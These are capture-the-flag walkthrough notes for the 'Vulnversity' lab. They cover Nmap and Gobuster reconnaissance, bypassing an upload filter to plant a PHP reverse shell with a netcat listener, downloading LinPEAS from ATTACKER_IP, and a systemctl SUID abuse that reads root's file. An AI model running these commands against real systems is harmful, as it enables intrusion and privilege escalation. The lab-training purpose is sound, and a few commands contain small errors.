# Vulnversity
## Reconnaissance

| Nmap Flag | Description
| --- | ---
| `-sV` | Attempt to determine version of running services.
| `-p <x>` or `-p-` | Port scan for port <x> or scan all ports.
| `-Pn` | Disable host discovery and scan for open ports.
| `-A` | Enable OS and version detection, executes in-built scripts for further examination.
| `-sC` | Scan with default Nmap scripts.
| `-v` | Verbose mode.
| `-sU` | UDP port scan.
| `-sS` | TCP SYN port scan.

## Locating Directories Using [Gobuster](https://github.com/OJ/gobuster)
* Brute forces URIs (directories and files), DNS subdomains, and virtual host names.
* Install Gobuster on Kali.
```
sudo apt-get install gobuster
```
* Requires wordlist to identify if public directory is available.
* Kali `/usr/share/wordlists` folder contains many wordlists.

| Gobuster Flag | Description
| --- | ---
| `dir` | Use directory/file bruteforcing.
| `-e` | Prints full URLs to the console.
| `-u` | Target URL.
| `-w` | Path to wordlist.
| `-U` and `-P` | Username and password for basic authentication.
| `-p <x>` | Proxy to use for requests.
| `-c <http cookies>` | Specify cookie for simulatin authentication.

## Compromise the Webserver
* [Download reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
* Upload to `http://TARGET_IP:3333/internal/`.
  * PHP file extensions blocked by upload form.
* Fuzz upload form using BurpSuite to identify which extensions are not blocked.
### Use the Intruder to automate customised attacks.
#### 1. Make a wordlist of extensions.
```
printf "php\nphp3\nphp4\nphp5\nphtml" >  phpext.txt
```
#### 2. Intercept browser traffic with BurpSuite.
#### 3. Send captured request to Intruder.
* "Sniper" attack type.
* "Payload Positions" > find the filename > prefix and suffix `ยง` to extension.
* "Payloads" > "Payload settings" > "Load" > phptext.txt.
   * `.phtml` extensions allowed by upload form.
#### 4. Start the attack.
* Edit `php-reverse-shell.php`.
   * Change IP to attacking machine.
   * Rename file to `php-reverse-shell.phtml`.
* Reverse shell is called on target.
* Forces a connection to listening attacker.
```
mv php-reverse-shell.php php-reverse-shell.phtml
```
#### 5. Listen to incoming connections using netcat.
```
nc -lvnp 1234
```
#### 6. Upload shell to webserver.
#### 7. Execute payload.
* Navigate to `http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml`
#### 8. Connection established on Netcat session.
```
Connection from 10.10.240.196 33302 received!
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:00:44 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Privilege Escalation
* Linux SUID (set owner userId upon execution) is special type of file permission.
* Gives temporary permissions to a user to run binary with permission of file owner.
  * `/usr/bin/passwd` binary file to change user password has SUID bit set.
  * User needs to be able to write to shadowers file but only root has access by default.
    * User account has root privileges to make the right changes.
```
4  2  1  4  2  1  4  2  1
r  w  x  r  w  x  r  w  x
SUID  V     V     V
r  w  s  r  w  x  r  w  x
-------
 User
```
* Upgrade to TTY shell using Python.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
* Search for all SUID files.
```
find / -user root -perm -4000 -print 2>/dev/null
```
  * `-user root` is file owner.
  * `-perm 4000` specifies permissions.
* Use [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) scripts to identify SUID vulnerabilties.
```
mkdir /home/kali/linpeas
cd /home/kali/linpeas
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
* Serve payload through python webserver.
```
python3 -m http.server
```
* Download LinPEAS to target.
* Ensure that target directory has write permissions (`/tmp`).
* Write LinPeas output to txt file.
```
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +c ./linpeas.txt
./linpeas.sh -a > linpeas.txt
```
* Read SUID part of linpeas.txt file.
```
grep -A 50 "SUID - Check easy privesc, exploits and write perms" ./linpeas.txt
```
   * `-A 50` means list 50 lines after the search term "SUID - Check easy privesc, exploits and write perms".
* LinPEAS shows /bin/systemctl highlighted in red/yellow signifying a 95% privilege escalation vector.
* Browse to [GTFOBins](https://gtfobins.github.io)
  * Select `SUID`'
  * `CTRL+F` and search for `systemctl`.
```
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

// Change to /tmp as this directory is writable
cd /tmp
// Create local SUID copy of bash binary and run it to maintain elevated (root) privileges.
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.PzHSya3VD0.service to /tmp/tmp.PzHSya3VD0.service.
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.X6k1yvp1ii.service to /tmp/tmp.X6k1yvp1ii.service. 
```
* `cat /tmp/output` to read file that contains contents of restricted `/root/root.txt` file.
